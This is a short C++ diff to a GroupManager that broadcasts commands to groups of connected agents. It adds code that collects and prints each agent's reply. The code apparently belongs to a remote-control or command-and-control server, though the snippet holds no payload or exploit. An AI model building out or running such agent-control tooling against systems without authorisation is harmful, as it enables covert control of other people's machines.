@@ -51,6 +51,7 @@ BOOL GroupManager::RemoveConnectionFromGroup(std::string szGroupName, AgentConne
 
 BOOL GroupManager::BroadcastToGroup(std::string szGroupName, std::string szCommand)
 {
+	std::string szData;
 	std::lock_guard<std::mutex> lock(mGroupMapMutex);
 
 	if (groupMap.count(szGroupName)) {
@@ -58,6 +59,8 @@ BOOL GroupManager::BroadcastToGroup(std::string szGroupName, std::string szComma
 		if (connectionsGroup.size()) {
 			for (AgentConnection* conn : connectionsGroup) {
 				conn->SendCommand(szCommand);
+				conn->ReceiveData(FALSE, szData);
+				std::cout << "[*] received from " << conn->GetSocketStr() << " : \n" << szData << "\n";
 			}
 
 			return TRUE;
